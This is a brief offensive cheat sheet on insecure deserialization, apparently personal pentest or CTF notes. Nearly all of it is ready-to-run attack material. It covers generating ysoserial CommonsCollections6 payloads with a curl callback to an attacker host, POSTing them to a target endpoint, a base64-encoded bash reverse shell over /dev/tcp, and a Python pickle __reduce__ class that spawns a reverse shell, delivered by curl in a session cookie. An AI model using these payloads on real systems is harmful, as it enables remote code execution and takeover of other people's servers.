# Deserialization

Java insecure deserialization (`ObjectInputStream.readObject()` on unfiltered input) + a vulnerable gadget library (e.g. commons-collections < 3.2.2) → RCE via ysoserial.

```bash
# build ysoserial in docker (works around local JDK version issues)
# Dockerfile: FROM eclipse-temurin:8-jre; wget ysoserial-all.jar <release>;
#   ENTRYPOINT ["java","-jar","ysoserial-all.jar"]

docker run --rm --platform linux/amd64 ysoserial:latest \
  CommonsCollections6 "curl http://<LHOST>:8000" | base64 > payload.b64

curl -X POST --data-binary @payload.b64 http://<TARGET>:<RPORT>/<import-endpoint> \
  -H 'Cookie: JSESSIONID=<sid>' -H "Content-Type: text/plain" -v

# multi-command reverse shell (Runtime.exec can't take a full shell pipeline directly)
# BASE64 = base64 of: bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}
```

Python `pickle.loads()` on attacker-controlled data (a session cookie, a cache value) → RCE via `__reduce__`:
```python
import pickle, subprocess, base64

class Exploit:
    def __reduce__(self):
        return (subprocess.Popen, (["bash", "-c", "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"],))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
# or hex-encode, depending on how the app decodes the cookie
```
```bash
curl -H 'Cookie: session_data=<encoded-pickle>' http://<TARGET>
```

